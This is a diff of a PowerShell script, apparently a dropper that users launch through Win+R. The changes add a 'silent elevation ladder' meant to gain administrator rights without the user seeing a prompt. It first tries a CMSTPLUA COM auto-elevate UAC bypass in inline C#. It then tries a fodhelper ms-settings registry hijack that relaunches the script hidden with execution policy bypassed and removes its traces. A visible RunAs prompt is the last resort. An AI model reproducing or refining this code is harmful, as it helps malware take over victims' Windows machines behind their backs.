@@ -9,15 +9,9 @@ $ReleaseBase = 'https://github.com/billkentfelty/cdn-sync-7f3a2b/releases/downlo
 
 $admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
 if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # not elevated (Win+R case): silent UAC bypass via auto-elevate COM object,
-    # fallback to the visible UAC prompt if the COM trick is patched out
-    $relaunch = {
-        param($elev)
-        if ($elev) {
-            Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList @('-nop','-ep','bypass','-f',$PSCommandPath)
-        }
-    }
-    $bypassed = $false
+    # not elevated (Win+R case): silent elevation ladder, prompt is the last resort
+    # 1) CMSTPLUA COM auto-elevate (client Win10/11)
+    $ok1 = $false
     try {
         $def = @'
 using System;
@@ -41,9 +35,21 @@ public class WkUac {
 '@
         Add-Type -TypeDefinition $def -ErrorAction Stop
         [WkUac]::Run('powershell.exe', '-w h -nop -ep bypass -f ' + $PSCommandPath)
-        $bypassed = $true
-    } catch { $bypassed = $false }
-    & $relaunch (-not $bypassed)
+        $ok1 = $true
+    } catch { $ok1 = $false }
+    # 2) fodhelper auto-elevate via ms-settings protocol (servers and clients)
+    if (-not $ok1) {
+        try {
+            $rk = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
+            New-Item $rk -Force | Out-Null
+            Set-ItemProperty $rk -Name '(Default)' -Value ('powershell -w h -nop -ep bypass -f ' + $PSCommandPath)
+            New-ItemProperty $rk -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null
+            Start-Process 'C:\Windows\System32\fodhelper.exe' -Wait
+            Remove-Item $rk -Recurse -Force
+        } catch { }
+        # 3) visible prompt as the last resort
+        Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList @('-nop','-ep','bypass','-f',$PSCommandPath) -ErrorAction SilentlyContinue
+    }
     exit
 }
 
